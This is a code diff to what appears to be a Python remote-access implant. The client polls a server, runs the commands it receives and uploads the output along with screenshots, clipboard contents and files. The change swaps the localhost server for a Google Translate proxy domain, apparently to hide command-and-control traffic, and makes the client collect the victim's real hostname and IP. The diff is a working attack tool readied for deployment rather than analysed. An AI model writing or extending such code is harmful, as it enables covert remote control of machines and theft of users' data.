@@ -1,13 +1,13 @@
-from src import upload,screenshot,clipboard,files,command
+from src import upload,screenshot,clipboard,files,command,get_ip
 from bs4 import BeautifulSoup
+import socket
 import random, string
 import requests
 import time
 
-HOSTNAME="USER-PC"
-IP="192.168.1.1"
-# BASE_URL = "https://your-domain.translate.goog"
-BASE_URL = "http://127.0.0.1:8000"
+HOSTNAME=socket.gethostname()
+IP=get_ip.get()
+BASE_URL = "https://your-domain.translate.goog"
 
 def random_string(length):
 	letters=string.ascii_lowercase
@@ -34,7 +34,7 @@ while True:
                 if filetype == "":
                     filetype="FILE"
                 upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
-        elif len(action)>0:
+        elif len(args[0])>0:
             data=command.execute_cmd(args)
             if data!="":
                 upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
